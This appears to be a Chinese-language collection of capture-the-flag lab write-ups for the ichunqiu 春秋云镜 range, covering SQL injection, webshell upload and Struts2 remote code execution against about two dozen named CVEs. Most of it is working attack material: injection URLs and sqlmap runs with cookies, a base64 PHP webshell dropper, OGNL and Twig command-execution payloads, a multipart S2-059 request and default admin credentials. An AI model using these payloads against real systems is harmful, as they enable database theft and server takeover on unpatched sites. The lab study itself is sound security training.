# 春秋云镜

## CVE-2022-32991 Web Based Quiz System SQL注入

先注册后登录

eid存在漏洞

### 手工注入

猜字段数

```
http://eci-2zeiglmgxybklc8oz8s6.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&n=1&t=10&eid=5b141f1e8399e' or 1=1 order by 5 --%20
```

![image-20230615212033338](%E9%9D%B6%E5%9C%BA.assets/image-20230615212033338.png)

![image-20230615212053347](%E9%9D%B6%E5%9C%BA.assets/image-20230615212053347.png)

所以存在5个字段

```
http://eci-2zeiglmgxybklc8oz8s6.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&n=1&t=10&eid=5b141f1e8399e' or 1=1 union select 1,2,3,4,5 --%20
```

![image-20230615212219521](%E9%9D%B6%E5%9C%BA.assets/image-20230615212219521.png)

```
http://eci-2zeiglmgxybklc8oz8s6.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&n=1&t=10&eid=5b141f1e8399e' or 1=1 union select 1,2,database(),4,5 --%20
```

![image-20230615212318358](%E9%9D%B6%E5%9C%BA.assets/image-20230615212318358.png)

```
' union select 1,2,group_concat(table_name),4,5 from information_schema.tables where table_schema='ctf' --%20
结果：  user,options,quiz,admin,questions,history,rank,flag,answer
' union select 1,2,group_concat(column_name),4,5 from information_schema.columns where  table_name='flag' --%20
结果：  flag
' union select 1,2,flag,4,5 from flag --%20
结果：下面
```

![image-20230615212819038](%E9%9D%B6%E5%9C%BA.assets/image-20230615212819038.png)



### 使用sqlmap

#### 1)使用sqlmap检测是否存在注入点

> python sqlmap.py -u  "http://eci-2zej8e2hn3s4jczjydgi.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&eid=5b141b8009cf0&n=1&t=10"

![img](%E9%9D%B6%E5%9C%BA.assets/1686100812_647fdb4c84ede3298da3e.png!small)

可以看到对获取到的url进行检测后，会302重定向到登录的url，说明我们检测的url必须带有登录权限才能验证，因此我们的命令中需要带上登录dvwa后的cookie信息。

在谷歌浏览器中贴上对应的cookie。

![img](%E9%9D%B6%E5%9C%BA.assets/1686100836_647fdb641ad85c1159494.png!small)

（注：u代表url ，--batch指的是sqlmap不会询问你的输入,全部默认确定。每个人都cookie都是不太一样的）

> python sqlmap.py -u  "http://eci-2zej8e2hn3s4jczjydgi.cloudecil.ichunqiu.com/welcome.php?q=quiz&step=2&eid =5b141b8009cf0&n=1&t=10"  --cookie="td_cookie=640699955;PHPSESSID=3qfukj93lq669vqf1idmnb5qnn"  --batch

![img](%E9%9D%B6%E5%9C%BA.assets/1686101161_647fdca95e3b96dc4fe4f.png!small)![img](%E9%9D%B6%E5%9C%BA.assets/1686101249_647fdd010c9474551ec2e.png!small)

以上分别列出了存在注入点的参数。

- 基于布尔的盲注。
- 基于错误的注入
- 基于时间的盲注
- 联合查询

#### 2)查看当前连接的数据库。

> python sqlmap.py -u  "http://eci-2zej8e2hn3s4jczjydgi.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&eid=5b141b8009cf0&n=1&t=10" --cookie="td_cookie=640699955;PHPSESSID=3qfukj93lq669vqf1idmnb5qnn"  --batch–-dbs

![img](%E9%9D%B6%E5%9C%BA.assets/1686101388_647fdd8cd9ce982ec9d78.png!small)猜测flag在ctf数据库中

#### 3)获取当前数据库中的所有数据表

> python sqlmap.py -u  "http://eci-2zej8e2hn3s4jczjydgi.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&eid=5b141b8009cf0&n=1&t=10" --cookie="td_cookie=640699955;PHPSESSID=3qfukj93lq669vqf1idmnb5qnn"  --batch –D ctf –-tables

![img](%E9%9D%B6%E5%9C%BA.assets/1686101535_647fde1facbc6321e2590.png!small)

#### 4)我们查看flag表中的所有列

> python sqlmap.py -u  "http://eci-2zej8e2hn3s4jczjydgi.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&eid=5b141b8009cf0&n=1&t=10" --cookie="td_cookie=640699955;PHPSESSID=3qfukj93lq669vqf1idmnb5qnn"  --batch –D ctf -T flag --columns

![img](%E9%9D%B6%E5%9C%BA.assets/1686101617_647fde711ea82b43cdc58.png!small)

#### 5)导出flag表中flag的列

> python sqlmap.py -u  "http://eci-2zej8e2hn3s4jczjydgi.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&eid=5b141b8009cf0&n=1&t=10" --cookie="td_cookie=640699955;PHPSESSID=3qfukj93lq669vqf1idmnb5qnn"  --batch –D ctf -T flag -C "flag" --dump

![img](%E9%9D%B6%E5%9C%BA.assets/1686101755_647fdefb9a3ac99c6bf21.png!small)

至此flag也解出来了。



## CVE-2022-28512 Fantastic Blog (CMS) SQL注入

无需注册

```
http://eci-2ze9nch9yrgm8gwlzeir.cloudeci1.ichunqiu.com/single.php?id=2' or 1=1 order by 9--%20
http://eci-2ze9nch9yrgm8gwlzeir.cloudeci1.ichunqiu.com/single.php?id=2' or 1=1 union select 1,2,3,4,5,6,7,8,9 --%20
但是没有回显

```





```
#查看数据库版本
http://eci-2ze9nch9yrgm8gwlzeir.cloudeci1.ichunqiu.com/single.php?id=1'+and+(updatexml(1,concat('~',version()),1))='

#查看数据库名
http://eci-2ze9nch9yrgm8gwlzeir.cloudeci1.ichunqiu.com/single.php?id=1'+and+(updatexml(1,concat('~',database()),1))='
返回 XPATH syntax error: '~ctf'

#查看表名
http://eci-2ze9nch9yrgm8gwlzeir.cloudeci1.ichunqiu.com/single.php?id=1'+and+(updatexml(1,concat('~',(select 
group_concat(table_name) from information_schema.TABLES where TABLE_SCHEMA=database())),1))='
返回 XPATH syntax error: '~titles,page_hits,membership_...' 后面被省略了。。。。。
http://eci-2ze7cxg52hg1pf3n7vot.cloudeci1.ichunqiu.com/single.php?id=1'+and+(updatexml(1,concat('~',substr((select 
group_concat(table_name) from information_schema.TABLES where TABLE_SCHEMA=database()),120,30)),1))='
返回 XPATH syntax error: '~ditors_choice,blogs,links,flag'

#查看字段名
http://eci-2ze7cxg52hg1pf3n7vot.cloudeci1.ichunqiu.com/single.php?id=1'+and+(updatexml(1,concat('~',substr((select group_concat(column_name) from information_schema.columns where table_name='flag'),1,30)),1))='
返回 XPATH syntax error: '~flag'

#读取flag
http://eci-2ze7cxg52hg1pf3n7vot.cloudeci1.ichunqiu.com/single.php?id=1'+and+(updatexml(1,concat('~',substr((select flag from flag),1,30)),1))='
XPATH syntax error: '~flag{2c3c72f6-f66d-4af2-b3e3-5'
http://eci-2ze7cxg52hg1pf3n7vot.cloudeci1.ichunqiu.com/single.php?id=1'+and+(updatexml(1,concat('~',substr((select flag from flag),22,30)),1))='
XPATH syntax error: '~f2-b3e3-5e556fcd041c}'
flag{2c3c72f6-f66d-4af2-b3e3-5e556fcd041c}
```



## CVE-2022-30887 Pharmacy Management System shell upload

靶标介绍：

多语言药房管理系统 (MPMS) 是用 PHP 和 MySQL 开发的, 该软件的主要目的是在药房和客户之间提供一套接口，客户是该软件的主要用户。该软件有助于为药房业务创建一个综合数据库，并根据到期、产品等各种参数提供各种报告。 该CMS中php_action/editProductImage.php存在任意文件上传漏洞，进而导致任意代码执行。

漏洞简介

    Pharmacy Management System（MPMS）是Mayuri K.个人开发者的一个多语言药房管理系统。Pharmacy Management System v1.0 版本存在安全漏洞，该漏洞源于组件 /php_action/editProductImage.php 包含远程代码执行（RCE）问题。攻击者利用该漏洞可以通过制作的图像文件执行任意代码。

不过我们想上传文件得进入后台，进入后台得找到用户名和密码。联系到此网站的作者是Mayuri K，我们可以尝试用作者的email和name作为用户名和密码。

    email：mayuri.infospace@gmail.com
    passwd：mayurik

登录不上去。。。。。。。。。。。。。。忘了加k

![image-20230616110847491](%E9%9D%B6%E5%9C%BA.assets/image-20230616110847491.png)



![image-20230616111253235](%E9%9D%B6%E5%9C%BA.assets/image-20230616111253235.png)

上传webshell



其余填写数字就行

![image-20230616111543116](%E9%9D%B6%E5%9C%BA.assets/image-20230616111543116.png)

```
http://eci-2ze9clflsbybn7pk9ka3.cloudeci1.ichunqiu.com/assets/myimages/poc.php?cmd=ls%20/
```

![image-20230616111615997](%E9%9D%B6%E5%9C%BA.assets/image-20230616111615997.png)

```
https://eci-2ze9clflsbybn7pk9ka3.cloudeci1.ichunqiu.com/assets/myimages/poc.php?cmd=cat%20/flag
```





![image-20230616111810738](%E9%9D%B6%E5%9C%BA.assets/image-20230616111810738.png)



## CVE-2022-23043 Zenario CMS 9.2 文件上传漏洞

*靶标介绍：*

Zenario CMS 9.2 文件上传漏洞，攻击者可上传webshell执行任意命令。登陆信息：admin/adminqwe12



![image-20230616112351032](%E9%9D%B6%E5%9C%BA.assets/image-20230616112351032.png)



![image-20230616151442516](%E9%9D%B6%E5%9C%BA.assets/image-20230616151442516.png)



![image-20230616145048939](%E9%9D%B6%E5%9C%BA.assets/image-20230616145048939.png)



![image-20230616145204505](%E9%9D%B6%E5%9C%BA.assets/image-20230616145204505.png)



/public/downloads/uSq8S/poc.phar

![image-20230616151545606](%E9%9D%B6%E5%9C%BA.assets/image-20230616151545606.png)

![image-20230616151625171](%E9%9D%B6%E5%9C%BA.assets/image-20230616151625171.png)



## CVE-2022-29464 WSO2文件上传漏洞



```shell
┌──(kali㉿kali)-[~/Desktop/chunqiuyunjing]
└─$ git clone https://github.com/hakivvi/CVE-2022-29464/       
Cloning into 'CVE-2022-29464'...
remote: Enumerating objects: 38, done.
remote: Counting objects: 100% (38/38), done.
remote: Compressing objects: 100% (36/36), done.
remote: Total 38 (delta 9), reused 6 (delta 1), pack-reused 0
Receiving objects: 100% (38/38), 15.63 KiB | 43.00 KiB/s, done.
Resolving deltas: 100% (9/9), done.
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/chunqiuyunjing]
└─$ cd CVE-2022-29464 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/chunqiuyunjing/CVE-2022-29464]
└─$ ls
exploit.py  README.md
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/chunqiuyunjing/CVE-2022-29464]
└─$ python exploit.py https://eci-2zee002a5sv1dtwxucav.cloudeci1.ichunqiu.com:9443/
Usage: python3 exploit.py https://host shell.jsp
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/chunqiuyunjing/CVE-2022-29464]
└─$ python exploit.py https://eci-2zee002a5sv1dtwxucav.cloudeci1.ichunqiu.com:9443/ shell.jsp
shell @ https://eci-2zee002a5sv1dtwxucav.cloudeci1.ichunqiu.com:9443//authenticationendpoint/shell.jsp
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/chunqiuyunjing/CVE-2022-29464]

```

![image-20230624161650774](%E9%9D%B6%E5%9C%BA.assets/image-20230624161650774.png)



flag{11a6daf0-9e16-434b-9c40-eec480f2e40a}

## CVE-2022-28525 ED01-CMS v20180505 存在任意文件上传漏洞

/admin login admin/admin



users->view all users

edit

![image-20230624163039787](%E9%9D%B6%E5%9C%BA.assets/image-20230624163039787.png)

图片位置上传 

忽略报错

http://eci-2zee002a5sv1e1t2ak9s.cloudeci1.ichunqiu.com/images/poc.php



![image-20230624163354804](%E9%9D%B6%E5%9C%BA.assets/image-20230624163354804.png)

## CVE-2022-28060 Victor CMS v1.0 存在sql注入

```
POST /includes/login.php HTTP/1.1
Host: eci-2ze9yuyw8sqsqqb6tip2.cloudeci1.ichunqiu.com
Content-Length: 82
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://eci-2ze9yuyw8sqsqqb6tip2.cloudeci1.ichunqiu.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://eci-2ze9yuyw8sqsqqb6tip2.cloudeci1.ichunqiu.com/register.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=ekifpu2u08ot7hvm16eap5fh1v
Connection: close

user_name=1'+AND+(SELECT*FROM+(SELECT+SLEEP(5))a)+AND+'1'='&user_password=2&login=
```

```
┌──(kali㉿kali)-[~/Desktop/chunqiuyunjing]
└─$ sqlmap -r cve-2022-28060.txt --sql-shell -v
        ___
       __H__                                                                                                                                                                                                                               
 ___ ___[.]_____ ___ ___  {1.7.2#stable}                                                                                                                                                                                                   
|_ -| . [']     | .'| . |                                                                                                                                                                                                                  
|___|_  [']_|_|_|__,|  _|                                                                                                                                                                                                                  
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                               

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 05:05:55 /2023-06-24/

[05:05:55] [INFO] parsing HTTP request from 'cve-2022-28060.txt'
[05:05:55] [WARNING] provided value for parameter 'login' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[05:05:57] [INFO] testing connection to the target URL
got a 302 redirect to 'http://eci-2ze9yuyw8sqsqqb6tip2.cloudeci1.ichunqiu.com:80/index.php'. Do you want to follow? [Y/n] y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] y
[05:06:12] [INFO] testing if the target URL content is stable
[05:06:13] [WARNING] POST parameter 'user_name' does not appear to be dynamic
[05:06:13] [WARNING] heuristic (basic) test shows that POST parameter 'user_name' might not be injectable
[05:06:13] [INFO] testing for SQL injection on POST parameter 'user_name'
[05:06:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:06:14] [INFO] POST parameter 'user_name' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[05:06:16] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[05:06:27] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[05:06:27] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[05:06:27] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[05:06:27] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[05:06:27] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[05:06:27] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[05:06:27] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[05:06:27] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[05:06:27] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:06:27] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:06:27] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[05:06:27] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[05:06:27] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[05:06:27] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[05:06:27] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:06:28] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[05:06:28] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[05:06:28] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[05:06:28] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[05:06:28] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[05:06:28] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[05:06:28] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[05:06:28] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[05:06:28] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[05:06:28] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[05:06:28] [INFO] testing 'Generic inline queries'
[05:06:28] [INFO] testing 'MySQL inline queries'
[05:06:28] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[05:06:28] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[05:06:28] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[05:06:28] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[05:06:28] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[05:06:28] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[05:06:28] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[05:06:49] [INFO] POST parameter 'user_name' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[05:06:49] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[05:06:49] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[05:06:50] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[05:06:51] [INFO] target URL appears to have 9 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] y





n
^Z
zsh: suspended  sqlmap -r cve-2022-28060.txt --sql-shell -v
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/chunqiuyunjing]
└─$ sqlmap -r cve-2022-28060.txt --sql-shell -v
        ___
       __H__                                                                                                                                                                                                                               
 ___ ___[']_____ ___ ___  {1.7.2#stable}                                                                                                                                                                                                   
|_ -| . ["]     | .'| . |                                                                                                                                                                                                                  
|___|_  [']_|_|_|__,|  _|                                                                                                                                                                                                                  
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                               

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 05:10:10 /2023-06-24/

[05:10:10] [INFO] parsing HTTP request from 'cve-2022-28060.txt'
[05:10:10] [WARNING] provided value for parameter 'login' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[05:10:10] [INFO] testing connection to the target URL
got a 302 redirect to 'http://eci-2ze9yuyw8sqsqqb6tip2.cloudeci1.ichunqiu.com:80/index.php'. Do you want to follow? [Y/n] n
[05:10:17] [INFO] testing if the target URL content is stable
[05:10:17] [WARNING] POST parameter 'user_name' does not appear to be dynamic
[05:10:17] [WARNING] heuristic (basic) test shows that POST parameter 'user_name' might not be injectable
[05:10:17] [INFO] testing for SQL injection on POST parameter 'user_name'
[05:10:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:10:18] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[05:10:18] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[05:10:18] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[05:10:18] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[05:10:19] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[05:10:19] [INFO] testing 'Generic inline queries'
[05:10:19] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[05:10:19] [WARNING] time-based comparison requires larger statistical model, please wait. (done)                                                                                                                                         
[05:10:19] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[05:10:20] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[05:10:20] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[05:10:41] [INFO] POST parameter 'user_name' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] n
[05:11:04] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[05:11:04] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[05:11:06] [INFO] checking if the injection point on POST parameter 'user_name' is a false positive
POST parameter 'user_name' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 76 HTTP(s) requests:
---
Parameter: user_name (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user_name=1' AND (SELECT 3268 FROM (SELECT(SLEEP(5)))bfEZ) AND 'MHFf'='MHFf&user_password=2&login=
---
[05:11:46] [INFO] the back-end DBMS is MySQL
[05:11:46] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
back-end DBMS: MySQL >= 5.0.12
[05:11:47] [INFO] calling MySQL shell. To quit type 'x' or 'q' and press ENTER
sql-shell> select load_file('/flag')
[05:11:56] [INFO] fetching SQL SELECT statement query output: 'select load_file('/flag')'
[05:11:56] [INFO] retrieved: 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[05:12:37] [INFO] adjusting time delay to 2 seconds due to good response times
flag{a77f7a98-b34
[05:17:23] [ERROR] invalid character detected. retrying..
[05:17:23] [WARNING] increasing time delay to 3 seconds
5
[05:17:47] [ERROR] invalid character detected. retrying..
[05:17:47] [WARNING] increasing time delay to 4 seconds
-4541-87e7-108f33e8dad3}
select load_file('/flag'): 'flag{a77f7a98-b345-4541-87e7-108f33e8dad3}'
sql-shell> 

```

## CVE-2022-26965 Pluck-CMS-Pluck-4.7.16 后台RCE

http://eci-2zea3w7mdswy019i9but.cloudeci1.ichunqiu.com/?file=cm

![image-20230627090210602](%E9%9D%B6%E5%9C%BA.assets/image-20230627090210602.png)

点击admin 输入密码admin

http://eci-2zea3w7mdswy019i9but.cloudeci1.ichunqiu.com/admin.php?action=start

![image-20230627090305569](%E9%9D%B6%E5%9C%BA.assets/image-20230627090305569.png)



https://github.com/pluck-cms/themes



![image-20230627091844832](%E9%9D%B6%E5%9C%BA.assets/image-20230627091844832.png)





```
<?php

file_put_contents('testshell.php',base64_decode('PD9waHAgc3lzdGVtKCRfR0VUWzFdKTs/Pg=='));

?>
```

![image-20230627092133057](%E9%9D%B6%E5%9C%BA.assets/image-20230627092133057.png)

![image-20230627092409094](%E9%9D%B6%E5%9C%BA.assets/image-20230627092409094.png)

![image-20230627092425169](%E9%9D%B6%E5%9C%BA.assets/image-20230627092425169.png)



http://eci-2zea3w7mdswy019i9but.cloudeci1.ichunqiu.com/testshell.php?1=cat%20/flag

![image-20230627092306418](%E9%9D%B6%E5%9C%BA.assets/image-20230627092306418.png)

## CVE-2013-1965 S2-012 RCE



```
name=%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat", "/flag"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
```



![image-20230711110652692](%E9%9D%B6%E5%9C%BA.assets/image-20230711110652692.png)



粘贴进去执行

![image-20230711112647122](%E9%9D%B6%E5%9C%BA.assets/image-20230711112647122.png)



## CVE-2010-1870 S2-005 远程代码执行漏洞

![image-20230711112712440](%E9%9D%B6%E5%9C%BA.assets/image-20230711112712440.png)

![image-20230711112725428](%E9%9D%B6%E5%9C%BA.assets/image-20230711112725428.png)



## CVE-2013-2134 S2-015

%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%2C%23q%7D.action

![image-20230711165738175](%E9%9D%B6%E5%9C%BA.assets/image-20230711165738175.png)



## CVE-2016-0785 s2-029

![image-20230711170026843](%E9%9D%B6%E5%9C%BA.assets/image-20230711170026843.png)

## CVE-2016-3081 s2-032

![image-20230711171736916](%E9%9D%B6%E5%9C%BA.assets/image-20230711171736916.png)

## CVE-2007-4556 s2-001

```
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"id"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
```

输入到username password里

![image-20230711204515245](%E9%9D%B6%E5%9C%BA.assets/image-20230711204515245.png)



## CVE-2012-0392 s2-008

![image-20230711212133326](%E9%9D%B6%E5%9C%BA.assets/image-20230711212133326.png)



![image-20230711212201503](%E9%9D%B6%E5%9C%BA.assets/image-20230711212201503.png)

## CVE-2012-0838 s2-007

![image-20230711212447025](%E9%9D%B6%E5%9C%BA.assets/image-20230711212447025.png)

![image-20230711212521784](%E9%9D%B6%E5%9C%BA.assets/image-20230711212521784.png)

flag{ad298f90-f9d0-48d5-b4f6-77da236c9a7e}

## CVE-2013-1966 s2-013

![image-20230711212758289](%E9%9D%B6%E5%9C%BA.assets/image-20230711212758289.png)



## CVE-2017-12611 s2-053

![image-20230711213504381](%E9%9D%B6%E5%9C%BA.assets/image-20230711213504381.png)

## CVE-2016-3087

![image-20230711213635504](%E9%9D%B6%E5%9C%BA.assets/image-20230711213635504.png)

## CVE-2019-0230 s2-059

```
POST /index.action HTTP/1.1
Host: eci-2zeiruv5maej1y8n9zdi.cloudeci1.ichunqiu.com:8080
Upgrade-Insecure-Requests: 1
User-Agent: curl
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh,zh-CN;q=0.9
Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1659237615
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Length: 838

------WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Disposition: form-data; name="name"


%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("cat /flag")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}
------WebKitFormBoundaryl7d1B1aGsV2wcZwF--
```

![image-20230712084234726](%E9%9D%B6%E5%9C%BA.assets/image-20230712084234726.png)





## CVE-2020-17530 s2-061

同上

![image-20230712084522933](%E9%9D%B6%E5%9C%BA.assets/image-20230712084522933.png)



## CVE-2013-2135 S2-015

![image-20230712101034123](%E9%9D%B6%E5%9C%BA.assets/image-20230712101034123.png)

## CVE-2013-2251 S2-016

![image-20230712101227834](%E9%9D%B6%E5%9C%BA.assets/image-20230712101227834.png)



## CVE-2020-26042 hoosk cms 1.8.0 sql inj

```
http://url/install/
```

post:

siteName=&siteURL=http%3A//baidu.com/%27%29%3Bif%28%24_REQUEST%5B%27s%27%5D%29%20%7B%0A%20%20system%28%24_REQUEST%5B%27s%27%5D%29%3B%0A%20%20%7D%20else%20phpinfo%28%29%3Bexit%28%29%3B//&dbName=mysql&dbUserName=root&dbPass=root&dbHost=127.0.0.1



get flag:

```
?s=cat%20../../../../../../flag
```





## CVE-2022-2073 Grav CMS存在任意代码执行漏洞

*靶标介绍：*

Grav CMS 可以通过 Twig 来进行页面的渲染，使用了不安全的配置可以达到远程代码执行的效果，影响最新版 v1.7.34 以下的版本

![image-20230712111557338](%E9%9D%B6%E5%9C%BA.assets/image-20230712111557338.png)

```
{{['cat\x20/flag']|filter('system')}}
```

![image-20230712111619238](%E9%9D%B6%E5%9C%BA.assets/image-20230712111619238.png)



